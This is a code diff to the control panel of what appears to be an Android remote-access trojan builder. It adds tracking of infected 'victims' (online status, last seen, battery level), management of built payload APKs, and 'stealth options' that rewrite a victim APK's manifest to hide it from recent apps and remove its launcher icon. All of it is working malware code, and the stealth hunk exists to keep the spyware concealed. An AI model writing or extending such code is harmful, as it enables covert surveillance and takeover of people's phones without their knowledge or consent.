@@ -86,6 +86,11 @@ var dataPath = dir.join(homedir(), CONSTANTS.dataDir);
 var downloadsPath = dir.join(dataPath, CONSTANTS.downloadPath);
 var outputPath = dir.join(dataPath, CONSTANTS.outputApkPath);
 var logPath = dir.join(dataPath, CONSTANTS.outputLogsPath);
+
+// Ensure output directory exists
+if (!fs.existsSync(outputPath)) {
+    fs.mkdirpSync(outputPath);
+}
 //--------------------------------------------------------------
 
 // Country code to flag image (using flagcdn.com for reliable rendering on all OS)
@@ -125,6 +130,16 @@ app.controller("AppCtrl", ($scope, $sce) => {
     $appCtrl.bindApk = {
         enable: false, method: 'BOOT'
     }; //default values for binding apk
+
+    // Dashboard/Settings properties
+    $appCtrl.platform = process.platform === 'win32' ? 'Windows' : process.platform === 'darwin' ? 'macOS' : 'Linux';
+    $appCtrl.outputPath = outputPath;
+    $appCtrl.downloadsPath = downloadsPath;
+    $appCtrl.builtPayloads = [];
+    $appCtrl.defaultPort = CONSTANTS.defaultPort || 42474;
+    $appCtrl.showNotifications = true;
+    $appCtrl.playSoundOnVictim = false;
+    $appCtrl.autoStartServer = false;
     
     // Stealth configuration options
     $appCtrl.stealthOptions = {
@@ -224,6 +239,71 @@ app.controller("AppCtrl", ($scope, $sce) => {
     $appCtrl.getVictimCount = () => {
         return Object.keys(viclist).length;
     };
+
+    // Get online victim count
+    $appCtrl.getOnlineCount = () => {
+        return Object.values(viclist).filter(v => v.isOnline !== false).length;
+    };
+
+    // Get offline victim count
+    $appCtrl.getOfflineCount = () => {
+        return Object.values(viclist).filter(v => v.isOnline === false).length;
+    };
+
+    // Format last seen time
+    $appCtrl.formatLastSeen = (timestamp) => {
+        if (!timestamp) return 'Unknown';
+        const diff = Date.now() - timestamp;
+        if (diff < 60000) return 'Just now';
+        if (diff < 3600000) return Math.floor(diff / 60000) + ' min ago';
+        if (diff < 86400000) return Math.floor(diff / 3600000) + ' hours ago';
+        return Math.floor(diff / 86400000) + ' days ago';
+    };
+
+    // Payload management
+    $appCtrl.refreshPayloads = () => {
+        try {
+            if (fs.existsSync(outputPath)) {
+                const files = fs.readdirSync(outputPath).filter(f => f.endsWith('.apk'));
+                $appCtrl.builtPayloads = files.map(f => {
+                    const stats = fs.statSync(path.join(outputPath, f));
+                    return {
+                        name: f,
+                        path: path.join(outputPath, f),
+                        size: (stats.size / 1024 / 1024).toFixed(2) + ' MB',
+                        date: stats.mtime
+                    };
+                }).sort((a, b) => b.date - a.date);
+            }
+            if (!$appCtrl.$$phase) $appCtrl.$apply();
+        } catch (e) {
+            console.error('Error refreshing payloads:', e);
+        }
+    };
+
+    // Copy payload path to clipboard
+    $appCtrl.copyPayloadPath = (payload) => {
+        if (payload && payload.path) {
+            require('electron').clipboard.writeText(payload.path);
+            $appCtrl.Log('[✓] Path copied to clipboard', CONSTANTS.logStatus.SUCCESS);
+        }
+    };
+
+    // Open folders
+    $appCtrl.openOutputFolder = () => {
+        if (shell) {
+            shell.openPath(outputPath);
+        }
+    };
+
+    $appCtrl.openDownloadsFolder = () => {
+        if (shell) {
+            shell.openPath(downloadsPath);
+        }
+    };
+
+    // Initialize payloads list
+    $appCtrl.refreshPayloads();
 
     // Convert country code to flag image (works on all OS including Windows)
     $appCtrl.getCountryFlag = (countryCode) => {
@@ -386,7 +466,46 @@ app.controller("AppCtrl", ($scope, $sce) => {
         }
     });
 
+    // Handle victim going offline (keep in list)
+    ipcRenderer.on('SocketIO:VictimOffline', (event, index) => {
+        if (viclist[index]) {
+            const victim = viclist[index];
+            victim.isOnline = false;
+            victim.lastSeen = Date.now();
+            $appCtrl.Log(`[⚠] Victim went offline: ${victim.ip} (${victim.manf} ${victim.model})`, CONSTANTS.logStatus.WARNING);
+        }
+        if (!$appCtrl.$$phase && !$appCtrl.$root.$$phase) {
+            $appCtrl.$apply();
+        }
+    });
+
+    // Handle live battery updates
+    ipcRenderer.on('SocketIO:BatteryUpdate', (event, data) => {
+        if (viclist[data.id]) {
+            viclist[data.id].battery = data.battery;
+            if (!$appCtrl.$$phase && !$appCtrl.$root.$$phase) {
+                $appCtrl.$apply();
+            }
+        }
+    });
+
+    // Remove victim permanently
+    $appCtrl.removeVictim = (index) => {
+        if (viclist[index]) {
+            const victim = viclist[index];
+            $appCtrl.Log(`[✗] Removed victim: ${victim.ip} (${victim.manf} ${victim.model})`, CONSTANTS.logStatus.INFO);
+            delete viclist[index];
+            if (!$appCtrl.$$phase && !$appCtrl.$root.$$phase) {
+                $appCtrl.$apply();
+            }
+        }
+    };
+
     $appCtrl.openLab = (index) => {
+        if (!viclist[index] || !viclist[index].isOnline) {
+            $appCtrl.Log(`[✗] Cannot open lab - victim is offline`, CONSTANTS.logStatus.FAIL);
+            return;
+        }
         $appCtrl.Log(`[→] Opening lab for victim: ${viclist[index].ip}`, CONSTANTS.logStatus.INFO);
         ipcRenderer.send('openLabWindow', 'lab.html', index);
     };
@@ -711,6 +830,46 @@ app.controller("AppCtrl", ($scope, $sce) => {
                         });
                     }
                 });
+
+                // Apply stealth options
+                if ($appCtrl.stealthOptions) {
+                    delayedLog('[→] Applying stealth options...', CONSTANTS.logStatus.INFO);
+                    
+                    // Find the MainActivity in the manifest
+                    if (parsedData.manifest.application && parsedData.manifest.application[0]) {
+                        const app = parsedData.manifest.application[0];
+                        
+                        // Hide from recents - add excludeFromRecents to all activities
+                        if ($appCtrl.stealthOptions.hideFromRecents && app.activity) {
+                            app.activity.forEach(activity => {
+                                activity.$['android:excludeFromRecents'] = 'true';
+                                activity.$['android:noHistory'] = 'true';
+                            });
+                            delayedLog('[✓] Hide from recents enabled', CONSTANTS.logStatus.SUCCESS);
+                        }
+                        
+                        // Hide app icon - remove LAUNCHER category from MainActivity
+                        if ($appCtrl.stealthOptions.hideIcon && app.activity) {
+                            app.activity.forEach(activity => {
+                                if (activity['intent-filter']) {
+                                    activity['intent-filter'].forEach(filter => {
+                                        if (filter.category) {
+                                            // Remove LAUNCHER category
+                                            filter.category = filter.category.filter(cat => 
+                                                cat.$['android:name'] !== 'android.intent.category.LAUNCHER'
+                                            );
+                                            // Keep only DEFAULT category or add it
+                                            if (filter.category.length === 0) {
+                                                filter.category = [{ $: { 'android:name': 'android.intent.category.DEFAULT' } }];
+                                            }
+                                        }
+                                    });
+                                }
+                            });
+                            delayedLog('[✓] App icon hidden from launcher', CONSTANTS.logStatus.SUCCESS);
+                        }
+                    }
+                }
 
                 // Convert the parsed data back to XML
                 const builder = new xml2js.Builder();
